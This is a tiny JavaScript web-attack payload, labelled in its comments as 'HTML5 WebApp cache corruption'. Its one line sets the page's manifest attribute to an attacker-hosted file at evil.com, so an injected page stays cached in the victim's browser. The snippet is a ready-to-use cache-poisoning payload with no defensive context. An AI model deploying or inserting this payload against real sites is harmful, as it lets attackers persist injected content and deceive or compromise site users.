/* HTML5 WebApp cache corruption            */
/* bad.manifest specifies the injected page */
/* not to be loaded again                   */

document.getElementsByTagName(&#34;html&#34;)[0].setAttribute(&#34;manifest&#34;,&#34;http://evil.com/bad.manifest&#34;);

